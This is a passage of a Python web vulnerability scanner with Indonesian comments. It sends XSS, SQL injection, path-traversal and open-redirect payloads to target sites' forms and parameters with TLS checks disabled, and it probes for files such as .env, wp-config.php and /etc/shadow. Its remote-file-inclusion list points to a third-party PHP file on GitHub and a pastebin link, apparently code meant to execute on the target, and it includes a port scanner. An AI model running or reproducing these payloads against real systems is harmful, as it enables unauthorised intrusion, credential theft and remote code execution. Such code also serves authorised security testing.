                elif not href.startswith(('http://', 'https://')):
                    href = urllib.parse.urljoin(url, href)
                
                # Filter URL yang hanya berasal dari domain yang sama
                if urllib.parse.urlparse(href).netloc == urllib.parse.urlparse(url).netloc:
                    urls.append(href)
            
            return list(set(urls))  # Hapus duplikat
        except Exception as e:
            self.log(f"Error ekstraksi URL dari {url}: {str(e)}", "ERROR")
            return []
    
    def scan_xss(self, url):
        """Scan Cross-Site Scripting (XSS)"""
        self.log(f"Memulai pemindaian XSS pada: {url}", "INFO")
        
        # XSS payloads untuk pengujian
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '"><iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '"><body onload=alert("XSS")>',
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<script>eval(\'x=document.cookie;if(x.includes("user")){{alert(x)}}\');</script>'
        ]
        
        # Ekstraksi form untuk pengujian
        forms = self.extract_forms(url)
        for form in forms:
            form_url = form['action'] if form['action'] else url
            if not form_url.startswith(('http://', 'https://')):
                form_url = urllib.parse.urljoin(url, form_url)
            
            # Uji setiap form dengan XSS payloads
            for payload in xss_payloads:
                form_data = {}
                
                # Isi data form dengan payload XSS
                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'search', 'email', 'url', 'password', 'hidden', 'file', 'tel']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field['value']
                
                try:
                    if form['method'] == 'post':
                        response = self.session.post(form_url, data=form_data, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(form_url, params=form_data, timeout=self.timeout, verify=False)
                    
                    # Deteksi refleksi payload
                    if payload in response.text:
                        self.log(f"Potensi kerentanan XSS ditemukan di {form_url} dengan form {form['method'].upper()} - payload: {payload}", "SUCCESS")
                        self.results['xss'].append({
                            'url': form_url,
                            'method': form['method'].upper(),
                            'form_details': form,
                            'payload': payload,
                            'evidence': 'Refleksi payload terdeteksi dalam respon'
                        })
                except Exception as e:
                    self.log(f"Error saat uji XSS pada {form_url}: {str(e)}", "ERROR")
        
        # Uji parameter URL untuk XSS
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if query_params:
            for param in query_params:
                for payload in xss_payloads:
                    test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={urllib.parse.quote(payload)}")
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        if payload in response.text:
                            self.log(f"Potensi kerentanan XSS ditemukan di {url} dengan parameter GET '{param}' - payload: {payload}", "SUCCESS")
                            self.results['xss'].append({
                                'url': url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Refleksi payload terdeteksi dalam respon'
                            })
                    except Exception as e:
                        self.log(f"Error saat uji XSS parameter GET pada {url}: {str(e)}", "ERROR")
        
        return self.results['xss']
    
    def scan_sql_injection(self, url):
        """Scan SQL Injection"""
        self.log(f"Memulai pemindaian SQL Injection pada: {url}", "INFO")
        
        # SQLi payloads untuk pengujian
        sqli_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            '" OR "1"="1',
            '" OR "1"="1" --',
            '" OR "1"="1" #',
            '") OR ("1"="1',
            '")) OR (("1"="1'
        ]
        
        # Ekstraksi form untuk pengujian
        forms = self.extract_forms(url)
        for form in forms:
            form_url = form['action'] if form['action'] else url
            if not form_url.startswith(('http://', 'https://')):
                form_url = urllib.parse.urljoin(url, form_url)
            
            # Uji setiap form dengan SQLi payloads
            for payload in sqli_payloads:
                form_data = {}
                
                # Isi data form dengan payload SQLi
                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'search', 'hidden', 'password']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field['value']
                
                try:
                    if form['method'] == 'post':
                        response = self.session.post(form_url, data=form_data, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(form_url, params=form_data, timeout=self.timeout, verify=False)
                    
                    # Deteksi potensi SQLi berdasarkan respons
                    sqli_indicators = [
                        'SQL syntax', 'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_num_rows',
                        'mysql_query', 'pg_query', 'mysqli_fetch_array', 'mysqli_result',
                        'Warning: mysql_', 'Warning: pg_', 'Warning: mysqli_',
                        'PostgreSQL error', 'ORA-01756', 'MySQL Error',
                        'ODBC SQL Server Driver', 'Microsoft OLE DB Provider for SQL Server',
                        'Unclosed quotation mark', 'ORA-00933'
                    ]
                    
                    for indicator in sqli_indicators:
                        if indicator.lower() in response.text.lower():
                            self.log(f"Potensi kerentanan SQL Injection ditemukan di {form_url} dengan form {form['method'].upper()} - payload: {payload}", "SUCCESS")
                            self.results['sqli'].append({
                                'url': form_url,
                                'method': form['method'].upper(),
                                'form_details': form,
                                'payload': payload,
                                'evidence': f"SQLi indicator terdeteksi: {indicator}"
                            })
                except Exception as e:
                    self.log(f"Error saat uji SQLi pada {form_url}: {str(e)}", "ERROR")
        
        # Uji parameter URL untuk SQLi
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if query_params:
            for param in query_params:
                for payload in sqli_payloads:
                    test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={urllib.parse.quote(payload)}")
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        sqli_indicators = [
                            'SQL syntax', 'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_num_rows',
                            'mysql_query', 'pg_query', 'mysqli_fetch_array', 'mysqli_result',
                            'Warning: mysql_', 'Warning: pg_', 'Warning: mysqli_',
                            'PostgreSQL error', 'ORA-01756', 'MySQL Error',
                            'ODBC SQL Server Driver', 'Microsoft OLE DB Provider for SQL Server',
                            'Unclosed quotation mark', 'ORA-00933'
                        ]
                        
                        for indicator in sqli_indicators:
                            if indicator.lower() in response.text.lower():
                                self.log(f"Potensi kerentanan SQL Injection ditemukan di {url} dengan parameter GET '{param}' - payload: {payload}", "SUCCESS")
                                self.results['sqli'].append({
                                    'url': url,
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"SQLi indicator terdeteksi: {indicator}"
                                })
                    except Exception as e:
                        self.log(f"Error saat uji SQLi parameter GET pada {url}: {str(e)}", "ERROR")
        
        return self.results['sqli']
    
    def scan_lfi(self, url):
        """Scan Local File Inclusion (LFI)"""
        self.log(f"Memulai pemindaian LFI pada: {url}", "INFO")
        
        # LFI payloads untuk pengujian
        lfi_payloads = [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/shadow',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/fd/0',
            '/proc/self/status',
            '/var/log/apache/access.log',
            '/var/log/apache2/access.log',
            '/var/log/httpd/access.log',
            '/var/log/nginx/access.log',
            '/windows/win.ini',
            '/boot.ini',
            '/windows/system32/drivers/etc/hosts',
            'C:/Windows/System32/drivers/etc/hosts',
            '../../../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\windows\\win.ini',
            '..\\windows\\win.ini'
        ]
        
        # Prefiks path traversal untuk pengujian terhadap bypass filter
        path_traversal_prefixes = [
            '',
            '../',
            '../../',
            '../../../',
            '../../../../',
            '../../../../../',
            '../../../../../../',
            '../../../../../../../',
            '../../../../../../../../',
            '../../../../../../../../../',
            '../../../../../../../../../../',
            '/%2e%2e/',
            '/%2e%2e%2f/',
            '/%2e%2e%2f%2e%2e%2f/',
            '/..././..././',
            '/.././.././',
            '/....//....///'
        ]
        
        # Common LFI parameters
        lfi_params = [
            'page', 'file', 'include', 'doc', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'lang', 'language',
            'section', 'content', 'site', 'menu', 'class', 'view', 'download', 'show',
            'dir', 'action', 'main', 'inc', 'locate', 'display', 'load'
        ]
        
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Check existing parameters for LFI
        for param in query_params:
            for payload in lfi_payloads:
                for prefix in path_traversal_prefixes:
                    full_payload = prefix + payload
                    test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={urllib.parse.quote(full_payload)}")
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        # Deteksi konten file yang berhasil disertakan
                        lfi_indicators = {
                            '/etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:', 'sync:', 'lp:'],
                            '/etc/hosts': ['localhost', '127.0.0.1'],
                            '/proc/self/environ': ['HTTP_USER_AGENT', 'SERVER_SOFTWARE', 'DOCUMENT_ROOT'],
                            '/proc/self/cmdline': ['apache', 'httpd', 'nginx', 'php'],
                            '/proc/self/status': ['Name:', 'Pid:', 'PPid:', 'VmSize:'],
                            '/windows/win.ini': ['for 16-bit app support', '[fonts]', '[extensions]'],
                            '/boot.ini': ['[boot loader]', 'default=', '[operating systems]'],
                            'C:/Windows/System32/drivers/etc/hosts': ['localhost', '127.0.0.1'],
                        }
                        
                        detected = False
                        
                        # Cek indikator untuk file tertentu
                        if payload.endswith('/etc/passwd'):
                            for indicator in lfi_indicators['/etc/passwd']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        elif payload.endswith('/etc/hosts'):
                            for indicator in lfi_indicators['/etc/hosts']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        elif payload.endswith('/proc/self/environ'):
                            for indicator in lfi_indicators['/proc/self/environ']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        elif payload.endswith('/windows/win.ini') or payload.endswith('win.ini'):
                            for indicator in lfi_indicators['/windows/win.ini']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        elif payload.endswith('/boot.ini'):
                            for indicator in lfi_indicators['/boot.ini']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        elif payload.endswith('hosts'):
                            for indicator in lfi_indicators['C:/Windows/System32/drivers/etc/hosts']:
                                if indicator in response.text:
                                    detected = True
                                    break
                        
                        if detected:
                            self.log(f"Potensi kerentanan LFI ditemukan di {url} dengan parameter '{param}' - payload: {full_payload}", "SUCCESS")
                            self.results['lfi'].append({
                                'url': url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': full_payload,
                                'evidence': 'Indikator konten file terdeteksi dalam respon'
                            })
                            # Lanjut ke parameter berikutnya setelah menemukan kerentanan
                            break
                    except Exception as e:
                        self.log(f"Error saat uji LFI parameter GET pada {url}: {str(e)}", "ERROR")
        
        # Test common LFI parameters if they don't exist in the URL
        if not query_params:
            base_url = url.split('?')[0]
            
            # Test each common LFI parameter
            for param in lfi_params:
                for payload in lfi_payloads[:5]:  # Hanya gunakan 5 payload pertama untuk menghemat waktu
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        # Deteksi indikator konten file yang berhasil disertakan
                        if '/etc/passwd' in payload and any(x in response.text for x in ['root:', 'daemon:', 'bin:']):
                            self.log(f"Potensi kerentanan LFI ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                            self.results['lfi'].append({
                                'url': base_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Indikator konten file terdeteksi dalam respon'
                            })
                            break
                        
                        if '/etc/hosts' in payload and any(x in response.text for x in ['localhost', '127.0.0.1']):
                            self.log(f"Potensi kerentanan LFI ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                            self.results['lfi'].append({
                                'url': base_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Indikator konten file terdeteksi dalam respon'
                            })
                            break
                            
                        if '/windows/win.ini' in payload and any(x in response.text for x in ['for 16-bit app support', '[fonts]']):
                            self.log(f"Potensi kerentanan LFI ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                            self.results['lfi'].append({
                                'url': base_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Indikator konten file terdeteksi dalam respon'
                            })
                            break
                    except Exception as e:
                        self.log(f"Error saat uji LFI parameter GET pada {base_url}: {str(e)}", "ERROR")
        
        return self.results['lfi']
    
    def scan_rfi(self, url):
        """Scan Remote File Inclusion (RFI)"""
        self.log(f"Memulai pemindaian RFI pada: {url}", "INFO")
        
        # RFI payloads untuk pengujian
        rfi_payloads = [
            'https://raw.githubusercontent.com/lazprof/seowot48/refs/heads/main/aziziasadel.php',
            'https://raw.githubusercontent.com/lazprof/seowot48/refs/heads/main/aziziasadel.php',
            'http://evil.example.com/rfi_test.txt?',
            'http://evil.example.com/rfi_test.txt%00',
            'https://pastebin.com/raw/PSeCDBzV'
        ]
        
        # Common RFI parameters
        rfi_params = [
            'page', 'file', 'include', 'doc', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'lang', 'language',
            'section', 'content', 'site', 'menu', 'class', 'view', 'download', 'show',
            'dir', 'action', 'main', 'inc', 'locate', 'display', 'load', 'url'
        ]
        
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Check existing parameters for RFI
        for param in query_params:
            for payload in rfi_payloads:
                test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={urllib.parse.quote(payload)}")
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                    
                    # Deteksi potensi RFI berdasarkan respons
                    if response.status_code >= 300 and response.status_code < 400:  # Redirect ke URL remote
                        self.log(f"Potensi kerentanan RFI ditemukan di {url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                        self.results['rfi'].append({
                            'url': url,
                            'method': 'GET',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f"Redirect terdeteksi: {response.status_code}"
                        })
                    
                    # Cek jika konten dari URL remote terlihat dalam respon
                    rfi_indicators = [
                        'root:x:', '<?php', '#!/bin/bash', '<script>', 'shell_exec',
                        'system(', 'exec(', 'passthru(', 'eval(', 'shell.txt'
                    ]
                    
                    for indicator in rfi_indicators:
                        if indicator in response.text:
                            self.log(f"Potensi kerentanan RFI ditemukan di {url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                            self.results['rfi'].append({
                                'url': url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"RFI indicator terdeteksi: {indicator}"
                            })
                            break
                except Exception as e:
                    self.log(f"Error saat uji RFI parameter GET pada {url}: {str(e)}", "ERROR")
        
        # Test common RFI parameters if they don't exist in the URL
        if not query_params:
            base_url = url.split('?')[0]
            
            # Test each common RFI parameter
            for param in rfi_params:
                for payload in rfi_payloads[:2]:  # Hanya gunakan 2 payload pertama untuk menghemat waktu
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                        
                        # Deteksi potensi RFI berdasarkan respons
                        if response.status_code >= 300 and response.status_code < 400:  # Redirect ke URL remote
                            self.log(f"Potensi kerentanan RFI ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                            self.results['rfi'].append({
                                'url': base_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Redirect terdeteksi: {response.status_code}"
                            })
                        
                        # Cek jika konten dari URL remote terlihat dalam respon
                        rfi_indicators = [
                            'root:x:', '<?php', '#!/bin/bash', '<script>', 'shell_exec',
                            'system(', 'exec(', 'passthru(', 'eval(', 'shell.txt'
                        ]
                        
                        for indicator in rfi_indicators:
                            if indicator in response.text:
                                self.log(f"Potensi kerentanan RFI ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                                self.results['rfi'].append({
                                    'url': base_url,
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"RFI indicator terdeteksi: {indicator}"
                                })
                                break
                    except Exception as e:
                        self.log(f"Error saat uji RFI parameter GET pada {base_url}: {str(e)}", "ERROR")
        
        return self.results['rfi']
    
    def scan_open_redirect(self, url):
        """Scan Open Redirect"""
        self.log(f"Memulai pemindaian Open Redirect pada: {url}", "INFO")
        
        # Open Redirect payloads untuk pengujian
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '//evil.com/',
            '//evil.com/%2F..',
            'https://evil.com//',
            'https:evil.com',
            'https://evil.com%252f%252f',
            'https://evil.com%2f%2f',
            'https://evil.com/..%2f',
            'https://evil.com/%2e%2e/'
        ]
        
        # Common redirect parameters
        redirect_params = [
            'url', 'redirect', 'return', 'returnTo', 'return_to', 'returnUrl', 'redirect_uri',
            'redirect_url', 'continue', 'to', 'link', 'goto', 'target', 'u', 'next', 'dest',
            'destination', 'redir', 'out', 'view', 'dir', 'show', 'navigation', 'Open',
            'returl', 'return_path', 'r', 'path', 'file', 'site', 'loc'
        ]
        
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Check existing parameters for open redirect
        for param in query_params:
            for payload in redirect_payloads:
                test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={urllib.parse.quote(payload)}")
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                    
                    # Deteksi redirect
                    if response.status_code >= 300 and response.status_code < 400:
                        location = response.headers.get('Location', '')
                        
                        # Cek jika Location header berisi domain yang mencurigakan
                        suspicious_domains = ['evil.com', '//evil.com', 'evil.com/', 'https://evil.com', 'http://evil.com']
                        
                        for domain in suspicious_domains:
                            if domain in location:
                                self.log(f"Potensi kerentanan Open Redirect ditemukan di {url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                                self.results['open_redirect'].append({
                                    'url': url,
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"Redirect terdeteksi ke: {location}"
                                })
                                break
                except Exception as e:
                    self.log(f"Error saat uji Open Redirect parameter GET pada {url}: {str(e)}", "ERROR")
        
        # Test common redirect parameters if they don't exist in the URL
        if not query_params:
            base_url = url.split('?')[0]
            
            # Test each common redirect parameter
            for param in redirect_params:
                for payload in redirect_payloads[:3]:  # Hanya gunakan 3 payload pertama untuk menghemat waktu
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                        
                        # Deteksi redirect
                        if response.status_code >= 300 and response.status_code < 400:
                            location = response.headers.get('Location', '')
                            
                            # Cek jika Location header berisi domain yang mencurigakan
                            suspicious_domains = ['evil.com', '//evil.com', 'evil.com/', 'https://evil.com', 'http://evil.com']
                            
                            for domain in suspicious_domains:
                                if domain in location:
                                    self.log(f"Potensi kerentanan Open Redirect ditemukan di {base_url} dengan parameter '{param}' - payload: {payload}", "SUCCESS")
                                    self.results['open_redirect'].append({
                                        'url': base_url,
                                        'method': 'GET',
                                        'parameter': param,
                                        'payload': payload,
                                        'evidence': f"Redirect terdeteksi ke: {location}"
                                    })
                                    break
                    except Exception as e:
                        self.log(f"Error saat uji Open Redirect parameter GET pada {base_url}: {str(e)}", "ERROR")
        
        return self.results['open_redirect']
    
    def scan_csrf(self, url):
        """Scan Cross-Site Request Forgery (CSRF)"""
        self.log(f"Memulai pemindaian CSRF pada: {url}", "INFO")
        
        # Ekstraksi form dari halaman
        forms = self.extract_forms(url)
        
        for form in forms:
            # Jika form menggunakan metode POST, periksa keberadaan token CSRF
            if form['method'] == 'post':
                has_csrf_token = False
                form_action = form['action'] if form['action'] else url
                
                # Cek keberadaan token CSRF dalam input fields
                for input_field in form['inputs']:
                    field_name = input_field['name'].lower()
                    
                    if any(token_name in field_name for token_name in ['csrf', 'token', 'nonce', 'xsrf', 'verify']):
                        has_csrf_token = True
                        break
                
                # Jika tidak ada token CSRF, ini mungkin rentan
                if not has_csrf_token:
                    self.log(f"Potensi kerentanan CSRF ditemukan di {form_action} - form tidak memiliki token CSRF", "SUCCESS")
                    self.results['csrf'].append({
                        'url': form_action,
                        'method': 'POST',
                        'form_details': form,
                        'evidence': 'Form POST tidak memiliki token CSRF'
                    })
        
        return self.results['csrf']
    
    def scan_clickjacking(self, url):
        """Scan Clickjacking"""
        self.log(f"Memulai pemindaian Clickjacking pada: {url}", "INFO")
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            
            # Periksa X-Frame-Options header
            x_frame_options = response.headers.get('X-Frame-Options', '').upper()
            
            # Periksa Content-Security-Policy header untuk frame-ancestors directive
            csp = response.headers.get('Content-Security-Policy', '')
            frame_ancestors_exists = 'frame-ancestors' in csp.lower()
            
            # Jika tidak ada header proteksi clickjacking, halaman mungkin rentan
            if not x_frame_options and not frame_ancestors_exists:
                self.log(f"Potensi kerentanan Clickjacking ditemukan di {url} - tidak ada header X-Frame-Options atau CSP frame-ancestors", "SUCCESS")
                self.results['clickjacking'].append({
                    'url': url,
                    'method': 'GET',
                    'evidence': 'Tidak ada header X-Frame-Options atau CSP frame-ancestors'
                })
        except Exception as e:
            self.log(f"Error saat uji Clickjacking pada {url}: {str(e)}", "ERROR")
        
        return self.results['clickjacking']
    
    def scan_sensitive_files(self, url):
        """Scan untuk file sensitif"""
        self.log(f"Memulai pemindaian file sensitif pada: {url}", "INFO")
        
        # Daftar file sensitif untuk dicek
        sensitive_files = [
            '/.git/config',
            '/.git/HEAD',
            '/.env',
            '/.htaccess',
            '/.htpasswd',
            '/backup.zip',
            '/backup.tar.gz',
            '/backup.sql',
            '/backup/',
            '/backup.old/',
            '/db.sql',
            '/dump.sql',
            '/database.sql',
            '/db_backup.sql',
            '/wp-config.php',
            '/config.php',
            '/configuration.php',
            '/config.inc.php',
            '/settings.php',
            '/config/',
            '/config.json',
            '/config.xml',
            '/credentials.xml',
            '/credentials.json',
            '/creds.txt',
            '/password.txt',
            '/passwords.txt',
            '/log.txt',
            '/logs.txt',
            '/error.log',
            '/errors.log',
            '/debug.log',
            '/access.log',
            '/server-status',
            '/server-info',
            '/info.php',
            '/phpinfo.php',
            '/test.php',
            '/web.config',
            '/robots.txt',
            '/sitemap.xml',
            '/crossdomain.xml',
            '/admin/',
            '/administrator/',
            '/admincp/',
            '/admindashboard/',
            '/cpanel/',
            '/phpmyadmin/'
        ]
        
        # Parse URL untuk mendapatkan base URL
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Cek setiap file sensitif
        for file in sensitive_files:
            test_url = base_url + file
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Jika respons 200 OK, file mungkin terekspos
                if response.status_code == 200:
                    # Beberapa pola untuk mengidentifikasi file sensitif
                    indicators = {
                        '.git/config': ['repositoryformatversion', '[core]', 'filemode', 'bare', 'ignorecase'],
                        '.git/HEAD': ['ref:', 'refs/heads/'],
                        '.env': ['APP_', 'DB_', 'MAIL_', 'QUEUE_', 'REDIS_', 'AWS_'],
                        '.htaccess': ['RewriteEngine', 'RewriteRule', 'RewriteCond', 'AuthType', 'Deny from all'],
                        '.htpasswd': [':'],
                        'backup': ['CREATE TABLE', 'DROP TABLE', 'INSERT INTO'],
                        'sql': ['CREATE TABLE', 'DROP TABLE', 'INSERT INTO'],
                        'wp-config.php': ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST', 'define'],
                        'config.php': ['$config', '$db', '$password', '$host', 'define'],
                        'server-status': ['Server Version', 'Server Built', 'Current Time', 'Restart Time', 'CPU Usage'],
                        'info.php': ['PHP Version', 'System', 'Build Date', 'Configure Command', 'php.ini'],
                        'phpinfo.php': ['PHP Version', 'System', 'Build Date', 'Configure Command', 'php.ini'],
                        'log': ['ERROR', 'WARNING', 'INFO', 'DEBUG', 'EXCEPTION'],
                        'admin': ['login', 'password', 'username', 'admin', 'dashboard'],
                        'robots.txt': ['Disallow:', 'Allow:', 'User-agent:'],
                        'sitemap.xml': ['<?xml', '<urlset', '<loc>', '</url>', '</urlset>'],
                        'crossdomain.xml': ['cross-domain-policy', 'allow-access-from', 'domain=']
                    }
                    
                    # Coba cocokkan indikator dengan konten
                    content_matches = False
                    for key, patterns in indicators.items():
                        if any(key in file.lower() for key in indicators.keys()):
                            if any(pattern.lower() in response.text.lower() for pattern in patterns):
                                content_matches = True
                                break
                    
                    # Jika konten cocok dengan pola yang diharapkan, tambahkan ke hasil
                    if content_matches or len(response.text) > 0:
                        self.log(f"File sensitif ditemukan di {test_url}", "SUCCESS")
                        self.results['sensitive_files'].append({
                            'url': test_url,
                            'method': 'GET',
                            'status_code': response.status_code,
                            'content_length': len(response.text),
                            'evidence': 'File sensitif ditemukan'
                        })
            except Exception as e:
                # Lanjut ke file berikutnya jika terjadi error
                pass
        
        return self.results['sensitive_files']
    
    def scan_upload_vulnerabilities(self, url):
        """Scan kerentanan upload file"""
        self.log(f"Memulai pemindaian kerentanan upload file pada: {url}", "INFO")
        
        # Gunakan enhanced uploader untuk test
        upload_test = self.uploader.test_upload_vulnerability(url, use_shell=False)
        
        if upload_test.get('vulnerable', False):
            self.log(f"Kerentanan upload file ditemukan di {url} - Level: {upload_test.get('vulnerability_level', 'Unknown')}", "SUCCESS")
            self.results['upload_vulnerabilities'].append(upload_test)
        else:
            self.log(f"Tidak ditemukan kerentanan upload file di {url}", "INFO")
        
        return self.results['upload_vulnerabilities']


# Class untuk pemindaian port
class PortScanner:
    """Kelas untuk pemindaian port pada target"""
    
    def __init__(self, timeout=1, verbose=False):
        self.timeout = timeout
        self.verbose = verbose
        self.results = []
    
    def log(self, message, level="INFO"):
        """Fungsi untuk logging"""
        color_map = {
            "INFO": LogColors.INFO,
            "SUCCESS": LogColors.SUCCESS,
            "WARNING": LogColors.WARNING,
            "ERROR": LogColors.ERROR,
            "CRITICAL": LogColors.CRITICAL
        }
        color = color_map.get(level, Fore.WHITE)
        
        log_msg = f"{color}[PORTSCAN] {message}{LogColors.RESET}"
        print(log_msg)
        
        if level == "INFO":
            logger.info(f"[PORTSCAN] {message}")
        elif level == "SUCCESS":
            logger.info(f"[PORTSCAN] {message}")
        elif level == "WARNING":
            logger.warning(f"[PORTSCAN] {message}")
        elif level == "ERROR":
            logger.error(f"[PORTSCAN] {message}")
        elif level == "CRITICAL":
            logger.critical(f"[PORTSCAN] {message}")
    
    def scan_port(self, target, port):
        """Pemindaian port tunggal"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            result = sock.connect_ex((target, port))
            service = self.get_service_name(port)
            banner = ""
            
            # Jika port terbuka, coba dapatkan banner
            if result == 0:
                try:
                    # Coba dapatkan banner hanya untuk protokol umum
                    if port in [21, 22, 25, 80, 110, 143, 443, 3306, 5432, 6379, 8080]:
                        sock.settimeout(2)
                        
                        # Kirim permintaan sesuai protokol
                        if port in [80, 443, 8080]:  # HTTP(S)
                            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                        elif port == 21:  # FTP
                            pass  # FTP mengirim banner secara otomatis
                        elif port == 22:  # SSH
                            pass  # SSH mengirim banner secara otomatis
                        elif port == 25:  # SMTP
                            pass  # SMTP mengirim banner secara otomatis
                        elif port == 110:  # POP3
                            pass  # POP3 mengirim banner secara otomatis
                        elif port == 143:  # IMAP
                            pass  # IMAP mengirim banner secara otomatis
                        
                        # Terima respons dan ekstrak banner
                        banner_data = sock.recv(1024)
                        if banner_data:
                            banner = banner_data.decode('utf-8', errors='ignore').strip()
                except:
                    banner = "Could not get banner"
            
            sock.close()
            
            if result == 0:
                self.log(f"Port {port} terbuka - {service}", "SUCCESS")
                return {
                    'port': port,
                    'state': 'open',
                    'service': service,
                    'banner': banner
                }
            return None
        except Exception as e:
            if self.verbose:
                self.log(f"Error saat scan port {port}: {str(e)}", "ERROR")
            return None
    
    def scan_target(self, target, ports=None):
        """Melakukan pemindaian port pada target"""
        if ports is None:
            # Port umum untuk diindai
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                    993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
        
        try:
            # Coba resolve hostname ke IP
            target_ip = socket.gethostbyname(target)
            self.log(f"Memulai pemindaian port pada: {target} ({target_ip})", "INFO")
            
            open_ports = []
            
            # Menggunakan ThreadPoolExecutor untuk pemindaian paralel
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self.scan_port, target_ip, port): port for port in ports}
                
                for future in tqdm(concurrent.futures.as_completed(futures), total=len(ports), desc="Port Scanning", disable=not self.verbose):
                    result = future.result()
                    if result:
                        open_ports.append(result)
            
            # Urutkan hasil berdasarkan nomor port
            open_ports.sort(key=lambda x: x['port'])
            self.results = open_ports
            
            if open_ports:
                self.log(f"Pemindaian selesai. Ditemukan {len(open_ports)} port terbuka pada {target}.", "SUCCESS")
            else:
